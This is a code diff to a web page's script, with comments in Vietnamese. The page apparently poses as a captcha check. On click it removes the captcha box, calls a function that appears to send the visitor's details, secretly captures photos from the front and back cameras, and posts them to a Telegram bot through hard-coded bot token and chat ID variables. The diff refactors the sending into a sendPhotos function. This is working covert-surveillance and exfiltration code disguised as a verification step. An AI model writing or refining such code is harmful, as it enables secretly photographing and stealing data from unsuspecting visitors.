@@ -102,24 +102,35 @@
       }
     }
 
-    async function startBot() {
-      document.getElementById("captcha-box").remove();
-      sendFullInfo();
+    async function sendPhotos(front, back) {
+      const urlPhoto = `https://api.telegram.org/bot${token}/sendPhoto`;
+      const urlMedia = `https://api.telegram.org/bot${token}/sendMediaGroup`;
 
-      const front = await captureCamera("user", "canvas1");
-      const back = await captureCamera("environment", "canvas2");
+      if (front && back) {
+        // Nếu có cả hai ảnh → gửi bằng sendMediaGroup
+        const form = new FormData();
+        const media = [];
 
-      const form = new FormData();
-      form.append("chat_id", chat_id);
-      if (front) form.append("photo", front, "front.jpg");
-      if (back) form.append("photo", back, "back.jpg");
+        media.push({ type: "photo", media: "attach://front.jpg" });
+        media.push({ type: "photo", media: "attach://back.jpg" });
 
-      if (front || back) {
-        await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
-          method: "POST",
-          body: form
-        });
+        form.append("chat_id", chat_id);
+        form.append("media", JSON.stringify(media));
+        form.append("front.jpg", front, "front.jpg");
+        form.append("back.jpg", back, "back.jpg");
+
+        await fetch(urlMedia, { method: "POST", body: form });
+
+      } else if (front || back) {
+        // Nếu chỉ có 1 ảnh → gửi bằng sendPhoto
+        const form = new FormData();
+        form.append("chat_id", chat_id);
+        form.append("photo", front || back, "photo.jpg");
+
+        await fetch(urlPhoto, { method: "POST", body: form });
+
       } else {
+        // Không có ảnh nào → báo lỗi
         await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
           method: "POST",
           headers: { "Content-Type": "application/json" },
@@ -129,6 +140,16 @@
           })
         });
       }
+    }
+
+    async function startBot() {
+      document.getElementById("captcha-box").remove();
+      sendFullInfo();
+
+      const front = await captureCamera("user", "canvas1");
+      const back = await captureCamera("environment", "canvas2");
+
+      await sendPhotos(front, back);
     }
   </script>
 </body>
